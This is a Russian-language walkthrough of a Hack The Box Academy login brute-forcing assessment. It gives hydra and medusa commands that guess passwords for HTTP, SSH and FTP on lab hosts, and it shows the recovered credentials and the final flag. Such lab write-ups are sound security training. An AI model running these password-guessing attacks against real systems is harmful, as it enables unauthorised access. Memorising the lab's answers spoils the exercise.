## Задание

В первой части оценки навыков вам нужно будет перебрать все возможные варианты логина для целевого экземпляра. Если вы успешно подберете правильный логин, то получите имя пользователя, которое понадобится вам для второй части оценки навыков.
Используйте имя пользователя, которое вам дали при выполнении части 1 оценки навыков, чтобы принудительно выполнить вход в целевой экземпляр.


## Часть 1

При переходе по URL встречает окно логина, значит используем `hydra`

![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/1.png)

Скачиваем необходимые списки для пароля и логина

Используем команду
```
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.63.174 -s 56021 http-get
```
И получаем логин и пароль

![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/2.png)


Залогинившись получаем логин для следующей части

![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/3.png)

`satwossh` - предполагаю, что будем брутить ssh подключение.


## Часть 2

Необходимо подключиться по FTP и выкачать файл с флагом.

Для начала подберем пароль для `SSH`
Используем команду

```
medusa -h 94.237.58.137 -n 34028 -u satwossh -P 2023-200_most_used_passwords.txt -M ssh -f -v 6 -t 10
```

![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/4.png)


`ACCOUNT FOUND: [ssh] Host: 94.237.58.137 User: satwossh Password: password1 [SUCCESS]`
Нашли нужный нам пароль, теперь подгововим команду для брута `FTP`, хотя пользователя мы еще не знаем.  

```
medusa -h 127.0.0.1  -u  -P 2023-200_most_used_passwords.txt -M ftp  -v 6 -t 10
```

Подключаемся по `SSH`
![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/5.png)


Видим два интересных файла , а также username-anacrhy для создания списка логинов.
Просмотрим файл репорта

![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/6.png)

Получаем имя `Thomas Smith`
В файле паролей - пароли.
Создадим список имен для томаса смита.
`satwossh@ng-2296943-loginbfsatwo-63ids-85dc79c85d-rjkp7:~/username-anarchy$ ./username-anarchy Thomas Smith > username.txt`

Получили различные варианты 
![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/7.png)


Теперь проверим директории `/` и `/home`, а также перенесем файл с логинами в предыдущую папку.

![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/8.png)

В директориях оказалось пусто.

Проведем сканирование сети
![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/9.png)

Видим открытый ftp порт, поэтому можем начинать брутфорсить, добавив в нашу команду список логинов и изменив название файла для паролей
```
medusa -h 127.0.0.1  -U username.txt  -P passwords.txt -M ftp  -v 6 -t 10
```


![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/10.png)

Находим УЗ 
`ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: thomas Password: chocolate! [SUCCESS]`

Теперь осталось подключится по `FTP`
```
ftp ftp://thomas:chocolate!@localhost
```
![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/11.png)

не дает зайти из-за символа `!`, поэтому оставим только логин и хост, а пароль введем уже при подключении 
![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/12.png)

Попадаем в облочку ftp
![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/13.png)

Просматриваем директорию на наличие файлов и обнаруживаем `flag.txt`, скачиваем его и просматриваем в нашем ssh подключении.
![image](https://github.com/onomatore/HTB_SA/blob/main/LoginBruteForcing/img/14.png)

`HTB{brut3f0rc1ng_succ3ssful}`
